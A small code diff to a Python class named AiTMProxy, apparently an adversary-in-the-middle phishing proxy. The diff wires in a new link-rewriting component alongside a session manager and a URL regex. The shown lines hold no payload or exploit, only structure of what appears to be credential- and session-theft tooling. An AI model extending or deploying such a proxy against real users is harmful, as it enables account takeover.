@@ -11,6 +11,7 @@ from urllib.parse import urljoin, urlparse, urlunparse, parse_qs, quote
 from fastapi import Request, Response, HTTPException, WebSocket
 from starlette.websockets import WebSocketDisconnect
 from core.session.session_manager import session_manager
+from core.proxy.advanced_link_modifier import AdvancedLinkModifier
 
 class AiTMProxy:
     """
@@ -24,6 +25,8 @@ class AiTMProxy:
         self.session_manager = session_manager
         # Regex pour détecter les URL absolues
         self.url_regex = re.compile(r'https?://[^\s"\']+')
+        # Moteur avancé de modification de liens
+        self.advanced_modifier = AdvancedLinkModifier()
 
     async def get_session(self) -> aiohttp.ClientSession:
         if self.session is None or self.session.closed:
